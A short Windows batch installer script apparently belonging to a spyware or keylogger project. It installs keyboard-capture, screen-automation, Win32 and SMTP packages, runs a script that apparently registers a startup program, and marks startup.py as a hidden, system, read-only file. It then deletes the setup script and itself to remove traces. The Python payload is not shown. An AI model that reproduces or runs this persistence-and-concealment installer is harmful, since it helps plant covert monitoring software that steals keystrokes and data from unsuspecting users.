
pip install beautifulsoup4
pip install requests
pip install pyautogui
pip install keyboard
pip install pywin32
pip install secure-smtplib
pip install email

echo running set_startup.py
python set_startup.py

echo set_startup.py has been successfully run
attrib +s +h +r "startup.py"

echo deleting all file
del set_startup.py
del autosetup.bat
echo all done
pause
